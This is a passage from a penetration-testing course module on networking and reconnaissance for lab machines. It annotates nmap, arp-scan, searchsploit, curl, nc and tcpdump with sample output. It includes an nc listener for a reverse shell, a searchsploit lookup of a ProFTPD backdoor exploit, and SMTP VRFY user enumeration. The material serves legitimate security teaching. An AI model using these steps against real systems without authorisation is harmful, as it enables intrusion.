# 01 — Foundations: Networking and Reconnaissance

Read this before **Machine 1**. Everything else in the path assumes it.

This module covers the minimum networking you need to understand what your tools
are doing. It is not a networking course — it is exactly the parts that determine
whether you can read an `nmap` scan. For the full treatment see
[`docs/CONCEPTS.md` §2](../docs/CONCEPTS.md#2-networking-you-must-know-first) and
[§5](../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 1. Theory

### Addresses: IP, MAC, and the difference that matters

An **IP address** (`192.168.56.104`) identifies a host on a network and is
*logical* — assigned by configuration, changeable, routed. A **MAC address**
(`08:00:27:3a:9c:11`) identifies a *network interface* and is burned into the
hardware — it is what actually moves frames across a local segment.

The **CIDR suffix** is the subnet size. `/24` means the first 24 bits are the
network, so `192.168.56.0/24` holds 256 addresses (`.0`–`.255`, of which `.0` and
`.255` are reserved). `/16` holds 65,536. You will mostly meet `/24` in labs.

The first three bytes of a MAC identify the vendor, and this is genuinely useful:

| Prefix | Vendor |
| --- | --- |
| `08:00:27` | VirtualBox |
| `00:0c:29`, `00:50:56` | VMware |
| `00:15:5d` | Hyper-V |

So when you scan your lab subnet and see three hosts, the two with VirtualBox
prefixes are VMs and the other is probably your router. **Always confirm the
target's MAC against your hypervisor's settings** — attacking the wrong host is
the classic first-night error, and on a real network it is an incident.

**ARP** is the protocol that maps IP → MAC on a local segment. It is why
`netdiscover` and `arp-scan` work when `ping` does not: ARP operates at layer 2 and
a host firewall cannot block it the way it blocks ICMP or TCP. A machine that
refuses to answer `ping` will still answer ARP.

### Ports: the part beginners under-use

An IP address gets you to the *machine*; a **port** (0–65535) gets you to the
*program*. `192.168.56.104:22` and `192.168.56.104:80` are the same host and two
completely different services.

Ports you will meet constantly in this path:

| Port | Service | Where in this path |
| --- | --- | --- |
| 21 | FTP | Machines 1, 5 |
| 22 | SSH | most |
| 25 | SMTP | Machine 12 |
| 80 / 8080 / 8000 | HTTP (and its alternates) | nearly all |
| 111, 2049 | rpcbind, NFS | — (Learning Path 2) |
| 139, 445 | SMB / NetBIOS | Machines 8, 11, 12 |
| 3306 | MySQL | Machines 10, 11 |
| 5432 | PostgreSQL | Machine 3 |
| 6667 | IRC | Machine 12 |
| 10000, 20000 | Webmin, Usermin | Machine 8 |
| 31337, 8888, 65535 | "author was having fun" | several |

> **Note the non-standard ones.** Real applications and CTF authors both move
> services off their usual ports. If your scan of `:80` shows nothing interesting,
> the web app may be on `:8080`, `:8000`, `:12380` or `:65535`. Machine 13 has no
> port 80 at all.

### The TCP three-way handshake: the basis of all port scanning

TCP is connection-oriented. Opening a connection takes three steps:

```text
Kali  ──SYN──────────────►  target      "can I talk to port 80?"
Kali  ◄──────────SYN-ACK──  target      "yes, I'm listening"
Kali  ──ACK──────────────►  target      "great, connection established"
```

The target has exactly three possible responses, and they map one-to-one onto the
words in every nmap report you will ever read:

| Target's reply | nmap says | What it means |
| --- | --- | --- |
| **SYN-ACK** | `open` | A program is listening there |
| **RST** | `closed` | The host is up, but nothing is listening on that port |
| *nothing*, or ICMP unreachable | `filtered` | A firewall dropped the packet |

**This is the single most important idea in the module.** Once you know it, `nmap`
stops being magic: it sends packets and classifies replies. Every flag is a
variation on *how much of the handshake do I complete* and *what do I send if the
target doesn't answer*.

A `-sS` (SYN / "stealth") scan sends the SYN and, on receiving SYN-ACK, sends RST
instead of ACK — so the connection is never completed and many applications never
log it. A `-sT` scan completes the handshake. That difference is the whole story.

---

## 2. Practice

### Finding the target

```bash
sudo arp-scan --localnet
# or: netdiscover -r 192.168.56.0/24
```

> **Why `sudo`:** ARP scans craft raw layer-2 frames, which needs root.

You will get several rows. One is your gateway (usually `.1`), one is **you**
(match the MAC from `ip -br a`), and the rest are candidates. Cross-check the MAC
prefix against your hypervisor, then confirm by booting the VM and looking at its
console — most VulnHub images print their IP, or you can run `ip a` inside them.

**Record the IP and MAC in your notes.** Every command in every walkthrough needs
the right one, and published walkthroughs used *their* author's addresses
(`192.168.56.101`, `10.0.2.15`, …). Substituting yours is the first thing you do.

Also add a hostname entry — many web apps behave differently (or only work) when
addressed by name:

```bash
echo "192.168.56.104  target.local" | sudo tee -a /etc/hosts
```

> **Why `sudo tee -a` and not `sudo echo >>`:** the shell performs the `>>`
> redirection *before* `sudo` runs, so it tries to write as your unprivileged user
> and fails with `Permission denied`. `tee -a` runs the write itself, as root.

### Scanning

Start broad, then narrow:

```bash
sudo nmap -sn 192.168.56.0/24                  # who is alive? (no port scan)
sudo nmap -p- -sV -sC -oA scans/all 192.168.56.104    # everything, with versions
```

The flags, and why each one is there:

| Flag | Meaning | Why it matters |
| --- | --- | --- |
| `-p-` | **all 65535 TCP ports** | The interesting service is often on `:8080` or `:31337`. Skipping this is how people get stuck for hours |
| `-sV` | version detection | `Apache 2.4.29` implies Ubuntu 18.04; `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit` |
| `-sC` | default NSE scripts | Runs the safe scripts — `ftp-anon`, `smb-os-discovery`, `http-title` |
| `-oA name` | all three output formats | `.nmap` (text), `.xml`, `.gnmap` (greppable). Save your scans |
| `-sU` | UDP scan | FTP is TCP; **SNMP, TFTP and RPC are UDP and invisible without this** |
| `-T4` | timing | Right for labs. **`-T5` misses ports** because it abandons slow replies |
| `--reason` | show *why* a port is in its state | The best learning flag in nmap |

Reading the output:

```text
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.3c
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

**Read the `Not shown` line — everyone skips it and it is the most informative
line in the report.** `65535 − 65532 = 3` interesting ports, and `(conn-refused)`
tells you the target answered with RSTs, so it is **up and responding**, not
firewalled. If it said `(no-response)` or `filtered`, you would be dealing with a
firewall and a completely different problem.

Then, for each open port, ask three questions in order:

1. **What service, exactly?** (`ProFTPD 1.3.3c`, not "ftp")
2. **What is its default behaviour?** Anonymous login? A default password? A demo page?
3. **Is that version known-vulnerable?** → `searchsploit <service> <version>`

That third question is the pivot into everything else in this path, and it is
covered in [module 02](02-Web-Attacks.md) and Machine 2.

### Enumeration: the phase people skip

| | **Scanning** | **Enumeration** |
| --- | --- | --- |
| Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
| Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
| Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |

**Enumeration produces the nouns that exploitation needs.** You cannot brute force
a login without a username. You cannot crack a hash you never found. You cannot
exploit an upload path you do not know. Every successful foothold in this path
traces back to an enumerated fact — which is why so many VulnHub authors write
"ENUMERATION IS THE KEY" in capitals in their description. They are telling you
which phase you are skipping.

---

## 3. Where you practise this

| Machine | What the foundations look like there |
| --- | --- |
| **1 — Basic Pentesting: 1** | Four services on odd ports (`21, 80, 8009, 8080`). Your first `-p-`, your first anonymous FTP, your first `dirb` |
| **2 — CyberSploit: 1** | A single web port and a lot of *reading*: HTML comments, `robots.txt`, then version → `searchsploit` |
| **3 — DC: 1** | Drupal on 80, plus MySQL and Postgres. Notice how the DB ports tell you the stack |
| **4 — DC: 2** | WordPress on a **non-standard port** (`:8888`) — a good lesson in why `-p-` is non-negotiable |
| **5 — Kioptrix: Level 1** | A 2010-era box: Apache 1.3, mod_ssl, Samba, `rpc.statd`. Legacy banners you have never seen before |

---

## 4. Exercises

Do these before Machine 1. They need no target VM.

1. **Read your own network.** Run `ip -br a`, `ip route`, `arp -a` and
   `cat /etc/resolv.conf`. Write down what each tells you. Which interface would
   you use for a lab scan?
2. **Scan yourself.** `sudo nmap -sV -p- 127.0.0.1`, then the same with `--reason`.
   Explain every line of output. Now run `sudo nmap -sS` and note what changes.
3. **Prove the handshake to yourself.** Start a listener
   (`python3 -m http.server 8000`), then in another terminal run
   `sudo nmap -p 8000 --reason 127.0.0.1` and watch the server log the request.
   Kill the server and scan again — the state changes from `open` to `closed`.
   Explain why, in terms of SYN/SYN-ACK/RST.
4. **Find a filtered port.** Use your OS firewall to drop (not reject) a port, then
   scan it and observe `filtered`. What did the target actually send back?
5. **Enumerate a real website — read-only and politely.** Pick a site you own or a
   deliberately vulnerable practice target such as
   [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) running locally in
   Docker. Run `curl -sI`, read every header, and write down what each one
   discloses. **Do not scan, brute force or attack any website you do not own.**

---

## 5. Check yourself

You are ready for Machine 1 when you can answer all of these without notes:

1. What are the three possible replies to a TCP SYN, and what does nmap call each?
2. Why does `Not shown: 65532 closed tcp ports (conn-refused)` tell you the target
   is not firewalled?
3. What is the difference between an IP address and a MAC address, and which one
   does ARP resolve?
4. Why must you use `-p-` rather than accept nmap's default port list?
5. Why does `-sU` find services that a default scan never sees?
6. What is the difference between scanning and enumeration? Give one example of a
   fact only enumeration can produce.
7. Why does `sudo echo x >> /etc/hosts` fail while `echo x | sudo tee -a /etc/hosts` works?

Full answers live in [`docs/CONCEPTS.md`](../docs/CONCEPTS.md) §2–§6.

---

## 6. Annotated command reference — every input, every output

This is the reference for the whole path. Each entry shows the command **exactly as
you will type it**, explains **every token in the input**, gives **real terminal
output**, and then reads that output **line by line**. Come back to this section
whenever a command in a walkthrough looks unfamiliar.

> **How to read these entries.** `TARGET` always means the IP of the victim VM and
> `ATTACKER` always means your Kali's IP on the lab interface. Substitute your own
> (find them with `ip -br a`). Published walkthroughs use *their* author's addresses
> — `192.168.56.101`, `10.0.2.15` — and copying those verbatim is the single most
> common reason a beginner's first lab "does not work".

---

### 6.1 `ip -br a` — what is *my* address?

```bash
ip -br a
```

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             10.0.2.15/24 08:00:27:1c:82:5e <BROADCAST,MULTICAST,UP,LOWER_UP>
eth1             UP             192.168.56.10/24 08:00:27:aa:bb:cc <BROADCAST,MULTICAST,UP,LOWER_UP>
```

**The input**

| Token | Meaning |
| --- | --- |
| `ip` | the modern replacement for `ifconfig`/`route`/`arp` — one tool for all network configuration |
| `-br` | **b**rief + **r**esolve-nothing: one line per interface, no clutter |
| `a` | short for `address` — the subcommand. `ip a` and `ip address show` are identical |

**Reading the output**

1. `lo` — **loopback**. `127.0.0.1` is your own machine; traffic to it never touches
   the network card. Every host has one. It is not interesting.
2. `eth0` → `10.0.2.15/24` with MAC `08:00:27:…` — the `08:00:27` prefix is
   **VirtualBox**. This is almost certainly your **NAT** interface: VirtualBox's
   built-in DHCP gave it an address, and it is how your VM reaches the internet.
3. `eth1` → `192.168.56.10/24` — this is your **host-only** interface. `192.168.56.x`
   is VirtualBox's default host-only network. **This is the one your lab traffic uses.**
4. `<BROADCAST,MULTICAST,UP,LOWER_UP>` — interface flags. **`UP` means the OS enabled
   it; `LOWER_UP` means there is an actual carrier/link.** An interface showing `UP`
   but *not* `LOWER_UP` is configured but has no cable — you will get zero results
   and no error message. This is the #1 silent failure in home labs.
5. `/24` — the CIDR prefix. 24 bits of network, so `2^(32−24) = 256` addresses:
   `192.168.56.0` through `192.168.56.255`.

**What to do with it.** Your target must be on the **same interface's subnet**. If
Kali is `192.168.56.10/24`, the target will be `192.168.56.<something>`. If you see
no `192.168.56.x` interface at all, your VM's network adapter is not set to
host-only — fix that in VirtualBox before touching nmap.

---

### 6.2 `sudo arp-scan --localnet` — who is on my subnet?

```bash
sudo arp-scan --localnet
```

```text
Interface: eth1, type: EN10MB, MAC: 08:00:27:aa:bb:cc, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.10   08:00:27:aa:bb:cc       Cadmus Computer Systems
192.168.56.104  08:00:27:11:22:33       Cadmus Computer Systems

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.842 seconds (138.98 hosts/sec). 3 responded
```

**The input**

| Token | Meaning |
| --- | --- |
| `sudo` | **required.** ARP scans send raw layer-2 Ethernet frames, which only root may craft |
| `arp-scan` | broadcasts "who has this IP?" for every address in the subnet and records who answers |
| `--localnet` | scan the subnet of **every** local interface, derived automatically from your own IP and netmask. No need to type a range |

**Reading the output**

1. The first line tells you **which interface** was used and its MAC — confirm it is
   `eth1` (host-only), not `eth0` (NAT). Scanning the wrong interface is a classic
   dead end.
2. `with 256 hosts` — `--localnet` expanded `/24` to all 256 addresses.
3. Each row is `IP  MAC  Vendor`. The **vendor** comes from the first three octets of
   the MAC (the OUI), looked up in a local database.
4. `192.168.56.1` is your **gateway** (VirtualBox's host side of the host-only net).
5. `192.168.56.10` is **you** — match it against `ip -br a`. Ignore it.
6. `192.168.56.104` with `08:00:27` = VirtualBox = **a VM**. That is your target.
7. The final line — `3 responded` — is your sanity check. **If it says `0 responded`,
   you scanned the wrong network or the target VM is not booted.** Do not proceed.

**Why ARP beats ping here.** ARP is layer 2: it cannot be routed, so it only works on
your local subnet — and it **cannot be blocked by a host firewall**, because the OS
network stack answers it before any firewall rule is consulted. `ping` (ICMP) is
routable *and* routinely blocked. On a lab subnet, ARP is the reliable method.

---

### 6.3 `sudo nmap -sn 192.168.56.0/24` — host discovery only

```bash
sudo nmap -sn 192.168.56.0/24
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 10:12 EEST
Nmap scan report for 192.168.56.1
Host is up (0.00042s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.104
Host is up (0.0011s latency).
MAC Address: 08:00:27:11:22:33 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.10
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.11 seconds
```

**The input**

| Token | Meaning |
| --- | --- |
| `-sn` | **"s**can **n**o ports" — ping sweep only. (Older nmap called this `-sP`.) |
| `192.168.56.0/24` | the target range in CIDR. `0` is the network address, `255` the broadcast |
| `sudo` | as root, nmap adds an **ARP ping** on local subnets, which is far more reliable than ICMP alone |

**Reading the output**

1. `Host is up (0.0011s latency).` — the round-trip time. Sub-millisecond means
   *same host/hypervisor* (a VM on your machine). Tens of milliseconds means a real
   network hop. This is a quick, free tell about topology.
2. `MAC Address:` lines appear **only** when nmap reached the host at layer 2 — i.e.
   it is on your local subnet. No MAC line for a host means it is remote, or answered
   only at layer 3.
3. `Oracle VirtualBox virtual NIC` — nmap's own OUI lookup. Confirms "this is a VM".
4. **Your own host (`192.168.56.10`) shows no latency and no MAC** — nmap recognises
   it as itself and skips the probes.
5. `Nmap done: 256 IP addresses (3 hosts up)` — the summary. Always read it: if you
   expected a target and it is not in the count, it is not booted.

---

### 6.4 `sudo nmap -p- -sV -sC -oA scans/all TARGET` — the scan you run on every box

```bash
mkdir -p scans
sudo nmap -p- -sV -sC -oA scans/all 192.168.56.104
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 10:15 EEST
Nmap scan report for 192.168.56.104
Host is up (0.00089s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.3c
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x   1 0        0            348 May 07  2018 deets.txt [NSE: writeable]
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:1f:83:2c:9d:2f:2a:8c:7e:35:29:cb:2c:d1:5c:9d (RSA)
|_  256 e4:9b:6b:c5:f4:0f:cb:6a:11:eb:2c:5c:f7:5a:9d:9a (ECDSA)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88 - Error report
| http-methods:
|_  Potentially risky methods: PUT DELETE
MAC Address: 08:00:27:11:22:33 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.22 seconds
```

**The input — every token**

| Token | Meaning | Why it is here |
| --- | --- | --- |
| `sudo` | run as root | Root lets nmap send **raw packets**, so `-sS` half-open scanning and ARP ping work. Without root nmap silently falls back to a full TCP connect |
| `-p-` | **all 65,535 TCP ports** | The default is the top 1,000. Services on `:8009`, `:8080`, `:31337` are invisible without this |
| `-sV` | **version detection** | After finding an open port, nmap probes it and fingerprints the exact product and version |
| `-sC` | **default NSE scripts** | Equivalent to `--script=default`. Runs the safe, informative scripts: `ftp-anon`, `ssh-hostkey`, `http-title`, `smb-os-discovery` |
| `-oA scans/all` | write **all three** output formats | `scans/all.nmap` (human), `scans/all.xml` (machine), `scans/all.gnmap` (greppable) |
| `192.168.56.104` | the target | One host here; a range or CIDR also works |

**Reading the output, line by line**

1. `Host is up (0.00089s latency).` — discovery succeeded; sub-millisecond means it is
   a local VM.
2. **`Not shown: 65531 closed tcp ports (conn-refused)`** — the most skipped and most
   informative line in the report.
   - `65535 − 65531 = 4` interesting ports, matching the four listed below.
   - **`closed`** means the target actively replied **RST** ("nothing is listening
     here"). That is *good news*: the host is reachable and answering, and there is no
     firewall in the way.
   - Contrast **`filtered`**, which means *no reply at all* — a firewall dropped the
     packet. Then it would read `(no-response)`, and your scan times would be enormous
     because nmap retransmits repeatedly. Seeing `filtered` tells you to change
     strategy (try `-sA`, slower timing, a different source port), not to keep waiting.
3. `PORT  STATE  SERVICE  VERSION` — the four columns:
   - **PORT** `21/tcp` — number and protocol.
   - **STATE** — one of `open` (something accepted the connection), `closed` (RST),
     `filtered` (no answer), `open|filtered` (nmap could not tell, typical for UDP).
   - **SERVICE** — nmap's *guess* from `/etc/services`. `ajp13` on 8009 is a guess
     based on the port number, not on evidence.
   - **VERSION** — the real fingerprint, from `-sV` probing. `ProFTPD 1.3.3c` is
     evidence. **Always trust VERSION over SERVICE.**
4. The **indented `|` lines are NSE script output**, from `-sC`. Each is prefixed with
   the script name:
   - `ftp-anon: Anonymous FTP login allowed (FTP code 230)` — **anonymous FTP works.**
     `230` is the FTP "logged in successfully" reply code.
   - `|-rwxr-xr-x 1 0 0 348 May 07 2018 deets.txt [NSE: writeable]` — the anonymous
     listing, and it found a file. Note the owner `0` and group `0`: **those are
     numeric UIDs, meaning UID 0 = root owns it.** `[NSE: writeable]` is a bonus
     finding — the anonymous user can *write* here too.
   - `ssh-hostkey:` — the server's public host keys with fingerprints. `2048 …(RSA)`
     and `256 …(ECDSA)`. Useful for detecting a man-in-the-middle later, and a weak
     1024-bit DSA key here would itself be a finding.
   - `_http-title: Apache Tomcat/7.0.88 - Error report` — the page title. The leading
     `_` marks the **last element of a list**. The title leaks the exact Tomcat
     version.
   - `http-methods: Potentially risky methods: PUT DELETE` — the server accepts
     `PUT`. That can mean **unauthenticated file upload** with plain HTTP.
5. `MAC Address: … (Oracle VirtualBox virtual NIC)` — layer-2 reachability and vendor.
6. **`Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel`** —
   extra data the scripts harvested. `Host: 127.0.1.1` is the machine's own idea of its
   hostname address (Debian/Ubuntu convention). **`CPE`** is a structured
   *Common Platform Enumeration* identifier — the machine-readable form you feed to
   vulnerability databases.
7. `Nmap done: … scanned in 143.22 seconds` — a full `-p- -sV -sC` scan takes minutes.
   **That is normal.** If it takes 30 seconds something was skipped; if it takes an
   hour you are hitting a firewall.

**Common failures and what they mean**

| Symptom | Cause | Fix |
| --- | --- | --- |
| `Note: Host seems down` | VM not booted, or wrong interface | Check VirtualBox; re-run `arp-scan` |
| Every port `filtered` | Host firewall, or you scanned a NAT'd address from outside | Scan from the host-only interface |
| `0 closed` and thousands of `filtered` | Rate limiting | Drop to `-T2` |
| Scan finds 22/80 only | You forgot `-p-` | Re-run with `-p-` |
| `Warning: 192.168.56.104 giving up on port because retransmission cap hit` | `-T5` too aggressive | Use `-T4` |

---

### 6.5 `sudo nmap -sU --top-ports 50 TARGET` — the UDP half everyone forgets

```bash
sudo nmap -sU --top-ports 50 192.168.56.104
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 10:22 EEST
Nmap scan report for 192.168.56.104
Host is up (0.00091s latency).
Not shown: 47 closed udp ports (port-unreach)
PORT     STATE         SERVICE
53/udp   open|filtered domain
68/udp   open|filtered dhcpc
111/udp  open          rpcbind
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/udp    rpcbind
|   100024  1          46238/udp    status
|_  100024  1          55341/tcp    status
MAC Address: 08:00:27:11:22:33 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 68.41 seconds
```

**The input**

| Token | Meaning |
| --- | --- |
| `-sU` | **UDP scan.** TCP and UDP are separate namespaces; a TCP scan tells you *nothing* about UDP |
| `--top-ports 50` | only the 50 most common UDP ports. A full UDP scan (`-p-`) takes **hours** because UDP is connectionless and nmap must wait for timeouts |

**Reading the output**

1. `Not shown: 47 closed udp ports (port-unreach)` — `47 closed + 3 shown = 50`.
   **"closed" in UDP means the host sent an ICMP *port unreachable* error**, which is
   proof it is alive and answering.
2. **`open|filtered`** is the confusing one and it is *normal*: UDP has no handshake, so
   **silence is ambiguous**. Either the service is there and did not reply (open), or a
   firewall dropped your packet (filtered). nmap honestly reports both possibilities.
   To resolve it, send a protocol-specific payload — e.g. `nmap -sU -p53 --script
   dns-recursion` — and see if you get a *protocol* answer.
3. `111/udp open rpcbind` — **definitively open** because it replied. `rpcinfo` then
   enumerated the RPC program registry: `100000` is rpcbind itself, `100024` is
   `status`. **`rpcbind` on 111 is the door to NFS** — check `showmount -e TARGET` and
   `nmap -p2049 --script nfs-ls,nfs-showmount`.
4. `68/udp dhcpc` — a DHCP client. Not interesting on a lab target, but it tells you
   the box obtained its address dynamically.

**Why this matters in this path.** Machine 5 (Kioptrix) exposes `rpcbind`/`rpc.statd`
and legacy SMB over 139. Missing the UDP scan means missing an entire attack surface.

---

### 6.6 `searchsploit` — turning a version string into a known exploit

```bash
searchsploit -t proftpd 1.3.3
searchsploit -m unix/remote/13574.txt
```

```text
---------------------------------------------------------------------------
 Exploit Title                                              |  Path
---------------------------------------------------------------------------
ProFTPD 1.3.3c - Backdoor Command Execution (Metasploit)   | unix/remote/15662.rb
ProFTPD 1.3.3c - Backdoor Command Execution                | unix/remote/13574.txt
ProFTPD 1.3.5 - 'mod_copy' Command Execution (Metasploit)  | linux/remote/36803.rb
---------------------------------------------------------------------------
Shellcodes: No Results

  Exploit: ProFTPD 1.3.3c - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/13574
     Path: /usr/share/exploitdb/exploits/unix/remote/13574.txt
    Codes: CVE-2010-4221, OSVDB-69563
 Verified: True
File Type: ASCII text
Copied to: 13574.txt
```

**The input**

| Token | Meaning |
| --- | --- |
| `searchsploit` | a **local, offline** search of the Exploit-DB archive shipped with Kali. No internet, no browser |
| `-t` | search **titles only**. Without it, searchsploit also matches file paths and you drown in false positives |
| `-m unix/remote/13574.txt` | **m**irror — copy that entry into your current directory so you can read and edit it |
| `-x <path>` | e**x**amine — print it to stdout instead of copying |
| `-p 13574` | show the full **p**ath for an EDB ID |
| `--update` | refresh the local database |

**Reading the output**

1. The table columns are **title** and **path**. The path encodes the taxonomy:
   `unix/remote/` = platform/family. **`remote`** means it works over the network;
   **`local`** means you already need a shell on the box. That distinction decides
   whether an entry is useful to you *right now*.
2. `Codes: CVE-2010-4221, OSVDB-69563` — the public identifiers. **CVE** is the
   international vulnerability ID you cite in a report; OSVDB is a defunct database
   whose IDs still appear in old entries.
3. **`Verified: True`** — Exploit-DB staff reproduced it. **`False` means unverified:
   read the code carefully, because it may not work, or may be hostile to whoever runs
   it.**
4. `File Type: ASCII text` — it is a text document (a writeup or a script listing), not
   a binary.
5. `Copied to: 13574.txt` — confirmation the mirror succeeded; the file is now in your
   working directory.

**The discipline.** Always `-x` or `less` the exploit **before** running it. You are
looking for three things: which variables to change (`RHOST`, `LHOST`, target offset),
whether it needs dependencies, and whether it does something you do not want. Running
code you have not read is how people compromise themselves.

---

### 6.7 `curl -sI http://TARGET/` — read the headers before the page

```bash
curl -sI http://192.168.56.104:8080/
```

```text
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: text/html;charset=ISO-8859-1
Date: Sat, 11 May 2024 07:31:04 GMT
```

**The input**

| Token | Meaning |
| --- | --- |
| `curl` | a command-line HTTP client. It is the tool you should reach for *first* — a browser hides everything |
| `-s` | **s**ilent: suppress the progress meter. Essential when piping output |
| `-I` | fetch **headers only** (sends `HEAD` instead of `GET`) |
| `http://…:8080/` | note the explicit port. `curl http://host/` assumes **80** — if the app is on 8080 and you omit it, you get nothing and assume the box is dead |

**Reading the output**

1. `HTTP/1.1 200 OK` — protocol version and status. **`200` = success.** See the
   status table in [module 02](02-Web-Attacks.md).
2. **`Server: Apache-Coyote/1.1`** — the server's self-identification. Coyote is
   Tomcat's HTTP connector, so this is Tomcat, not Apache httpd. Version disclosure
   like this is itself a (low-severity) finding, and a research lead.
3. `Content-Type: text/html;charset=ISO-8859-1` — what the server claims it is
   sending. A `text/plain` reply for a `.php` file means **PHP is not executing** — a
   very common misconfiguration and an information leak.
4. Other headers worth hunting for: `X-Powered-By: PHP/5.5.9-1ubuntu4.14` (exact
   language version), `http-generator: Koken 0.22.24` (exact CMS — Machine 11 is
   fingerprinted entirely from this), `Set-Cookie:` (session mechanics), `Location:`
   (redirect target), `WWW-Authenticate:` (auth scheme).

**The `-I` caveat.** Some servers answer `HEAD` differently from `GET`, or not at all.
If `-I` returns nothing, use `curl -s -D - -o /dev/null URL` — `-D -` dumps headers to
stdout, `-o /dev/null` discards the body — which performs a real `GET` but shows you
only the headers.

---

### 6.8 `nc` — the swiss-army network tool

```bash
nc -zv 192.168.56.104 21          # is one port open, quickly?
nc -lvnp 4444                     # listen for a reverse shell
nc 192.168.56.104 25              # talk to SMTP by hand
```

```text
$ nc -zv 192.168.56.104 21
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.104:21.
Ncat: 0 bytes sent, 0 bytes received in 0.01 seconds.
```

```text
$ nc 192.168.56.104 25
220 symfonos.localdomain ESMTP Postfix (Ubuntu)
EHLO attacker
250-symfonos.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY helios
250 2.1.5 helios
```

**The input**

| Token | Meaning |
| --- | --- |
| `-z` | **z**ero-I/O mode: connect, report, disconnect. A port probe, not a session |
| `-v` | verbose — print what happened |
| `-l` | **l**isten. Turns nc into a server instead of a client |
| `-n` | no DNS resolution — faster, and avoids leaking your queries |
| `-p 4444` | the local port to bind when listening |
| `HOST PORT` | when connecting: where to go |

**Reading the output**

1. `Ncat: Connected to …:21.` — the TCP three-way handshake completed, so the port is
   **open**. If it were closed you would see `Connection refused`; if filtered, nc would
   hang until it times out.
2. **`0 bytes sent, 0 bytes received`** — with `-z`, nc says nothing. Expected.
3. The SMTP session: `220` is the **greeting**, sent by the server before you type
   anything. It leaks the hostname (`symfonos.localdomain`) and the software
   (**Postfix**, Ubuntu build).
4. `EHLO` asks for the **extended** capability list; `250-` lines are continuation and
   the final `250 ` (with a space, not a hyphen) ends the list. **Read that list as a
   menu of attack surface:**
   - **`250-VRFY`** — the server will confirm whether a username exists. That is user
     enumeration, enabled. Machine 12 depends on this.
   - `250-STARTTLS` — it can upgrade to TLS; your plaintext commands are interceptable.
   - `250-SIZE 10240000` — a 10 MB message limit.
5. `VRFY helios` → **`250 2.1.5 helios`** = *that user exists*. A `550 5.1.1
   <name>: Recipient address rejected: User unknown` would mean it does not.

**SMTP reply codes, the three you need:** `2xx` = success · `3xx` = "keep going, I need
more" (e.g. `354` after `DATA`) · `4xx` = temporary failure, retry · `5xx` = permanent
failure. `550` almost always means "no such user" or "access denied".

---

### 6.9 `sudo tcpdump` — see the packets, understand the handshake

```bash
sudo tcpdump -ni eth1 host 192.168.56.104 and tcp port 80 -c 12
```

```text
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:31:02.114001 IP 192.168.56.10.43210 > 192.168.56.104.80: Flags [S], seq 2879401123, win 64240, options [mss 1460,sackOK,TS val 1234 ecr 0,nop,wscale 7], length 0
10:31:02.114812 IP 192.168.56.104.80 > 192.168.56.10.43210: Flags [S.], seq 918273645, ack 2879401124, win 65160, options [mss 1460,sackOK,TS val 555 ecr 1234,nop,wscale 7], length 0
10:31:02.114890 IP 192.168.56.10.43210 > 192.168.56.104.80: Flags [.], ack 1, win 502, options [nop,nop,TS val 1235 ecr 555], length 0
10:31:02.116203 IP 192.168.56.10.43210 > 192.168.56.104.80: Flags [P.], seq 1:79, ack 1, win 502, length 78: HTTP: GET / HTTP/1.1
10:31:02.117104 IP 192.168.56.104.80 > 192.168.56.10.43210: Flags [P.], seq 1:239, ack 79, win 509, length 238: HTTP: HTTP/1.1 200 OK
```

**The input**

| Token | Meaning |
| --- | --- |
| `sudo` | capturing packets requires root (the `CAP_NET_RAW` capability) |
| `-n` | do **not** resolve names to hostnames — much faster, and avoids DNS noise |
| `-i eth1` | capture on this interface only |
| `host … and tcp port 80` | a **BPF filter**, evaluated in the kernel. Only matching packets are captured |
| `-c 12` | stop after 12 packets, so the command terminates on its own |

**Reading the output — this is the TCP three-way handshake, visible**

1. `Flags [S]` — **SYN**. Your machine (`.10`, ephemeral port `43210`) asks to open a
   connection. `seq 2879401123` is your initial sequence number, `win 64240` your
